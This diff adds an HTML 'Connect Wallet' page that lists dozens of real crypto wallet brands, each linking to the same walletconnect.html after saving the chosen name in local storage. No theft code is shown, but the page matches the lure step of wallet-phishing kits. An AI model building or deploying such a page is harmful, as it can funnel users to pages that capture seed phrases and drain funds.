@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect Wallet</title>
+  <link rel="stylesheet" href="option.css" />
+  <script>
+    // Save the wallet name when a user clicks it
+    function selectWallet(walletName) {
+      try {
+        localStorage.setItem("selectedWallet", walletName);
+      } catch (e) {
+        // ignore storage errors (private mode, etc.)
+        console.warn("Could not save selected wallet:", e);
+      }
+    }
+  </script>
+</head>
+<body>
+
+  <section class="connect-wallet">
+    <h2>Connect Wallet</h2>
+    <p>Open protocol for connecting Wallets to Torch</p>
+
+    <div class="wallet-grid">
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Wallet Connect')">
+        <img src="wl/1.png" alt="Wallet 1" />
+        <span>Wallet Connect</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Torch Wallet')">
+        <img src="wl/2.jpeg" alt="Wallet 1" />
+        <span>Torch Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Zilpay Wallet')">
+        <img src="wl/3.jpeg" alt="Wallet 1" />
+        <span>Zilpay Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Zillet Wallet')">
+        <img src="wl/5.jpeg" alt="Wallet 1" />
+        <span>Zillet Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Ledger Wallet')">
+        <img src="wl/6.png" alt="Wallet 1" />
+        <span>Ledger Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Moonlet Wallet')">
+        <img src="wl/7.jpeg" alt="Wallet 1" />
+        <span>Moonlet Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Trust Wallet')">
+        <img src="wl/12.jpeg" alt="Wallet 1" />
+        <span>Trust Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Metamask Wallet')">
+        <img src="wl/13.png" alt="Wallet 1" />
+        <span>Metamask Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Coinbase Wallet')">
+        <img src="wl/8.png" alt="Wallet 1" />
+        <span>Coinbase Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Zilswap Wallet')">
+        <img src="wl/9.png" alt="Wallet 1" />
+        <span>Zilswap Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Zilliqa Wallet')">
+        <img src="wl/11.png" alt="Wallet 1" />
+        <span>Zilliqa wallet</span>
+      </a>
+
+     
+      <!-- <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Other Wallet')">
+        <img src="wl/1.png" alt="Wallet 2" />
+        <span>OtherWallet</span>
+      </a> -->
+      <!-- OTHER WALLET DROPDOWN TRIGGER -->
+<div class="wallet-dropdown">
+  <div class="wallet-trigger" onclick="toggleDropdown()">
+    <img src="wl/1.png" alt="Other Wallet" />
+    <span>Other Wallet</span>
+    <svg class="arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+  </div>
+
+  <!-- DROPDOWN LIST - 20+ REAL WALLETS -->
+  <div class="dropdown-list" id="walletList">
+    <!-- Each wallet goes to walletconnect.html + passes name -->
+    <div class="dropdown-scroll">
+      <a href="walletconnect.html" onclick="selectWallet('Rainbow')">Rainbow</a>
+      <a href="walletconnect.html" onclick="selectWallet('Zerion')">Zerion</a>
+      <a href="walletconnect.html" onclick="selectWallet('Argent')">Argent</a>
+      <a href="walletconnect.html" onclick="selectWallet('Pillar')">Pillar</a>
+      <a href="walletconnect.html" onclick="selectWallet('imToken')">imToken</a>
+      <a href="walletconnect.html" onclick="selectWallet('ONTO')">ONTO</a>
+      <a href="walletconnect.html" onclick="selectWallet('TokenPocket')">TokenPocket</a>
+      <a href="walletconnect.html" onclick="selectWallet('MathWallet')">MathWallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('BitKeep')">BitKeep</a>
+      <a href="walletconnect.html" onclick="selectWallet('SafePal')">SafePal</a>
+      <a href="walletconnect.html" onclick="selectWallet('Exodus')">Exodus</a>
+      <a href="walletconnect.html" onclick="selectWallet('Atomic Wallet')">Atomic Wallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('Frontier')">Frontier</a>
+      <a href="walletconnect.html" onclick="selectWallet('1inch Wallet')">1inch Wallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('Huobi Wallet')">Huobi Wallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('OKX Wallet')">OKX Wallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('Binance Wallet')">Binance Wallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('Phantom')">Phantom</a>
+      <a href="walletconnect.html" onclick="selectWallet('Mycelium')">Mycelium</a>
+      <a href="walletconnect.html" onclick="selectWallet('Coinomi Wallet')">Coinomi Wallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('Hashpack')">Hashpack</a>
+      <a href="walletconnect.html" onclick="selectWallet('CustWallet')">Cust Wallet</a>
+      <a href="walletconnect.html" onclick="selectWallet('keystone')">Keystone</a>
+      <a href="walletconnect.html" onclick="selectWallet('Uniswap')">Uniswap</a>
+      <a href="walletconnect.html" onclick="selectWallet('Elipal')">Elipal</a>
+      <a href="walletconnect.html" onclick="selectWallet('access an other wallet')">others</a>
+    </div>
+  </div>
+</div>
+      <!-- ... up to 116 -->
+    </div>
+  </section>
+<script>
+function toggleDropdown() {
+  const list = document.getElementById('walletList');
+  const trigger = document.querySelector('.wallet-trigger');
+  list.classList.toggle('open');
+  trigger.parentElement.classList.toggle('dropdown-open');
+}
+
+// Pass selected wallet name to walletconnect.html
+function selectWallet(name) {
+  localStorage.setItem('selectedWallet', name);
+  // Optional: show name on next page
+  console.log('Selected:', name);
+}
+
+// Auto-close on outside click
+document.addEventListener('click', function(e) {
+  if (!e.target.closest('.wallet-dropdown')) {
+    document.getElementById('walletList').classList.remove('open');
+    document.querySelector('.wallet-trigger').parentElement.classList.remove('dropdown-open');
+  }
+});
+</script>
+</body>
+</html>
